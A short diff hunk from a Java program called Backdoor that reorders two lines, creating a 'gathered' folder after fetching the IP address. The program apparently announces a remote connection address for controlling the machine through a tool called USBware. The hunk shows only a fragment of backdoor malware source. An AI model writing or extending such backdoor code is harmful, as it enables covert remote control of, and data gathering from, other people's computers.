@@ -35,8 +35,8 @@ public class Backdoor {
 		if(args.length==0){
 			String disp=null;
 			try{
-				new File("gathered").mkdir();
 				ip=getIP();
+				new File("gathered").mkdir();
 				disp="Backdoor running!\n\nTo control backdoor, connect to:\n"+Utils.currentConnection()+"\nand run option 1 in USBware";
 			}catch(Exception e){
 				disp="An error occurred:\n"+e.getMessage();
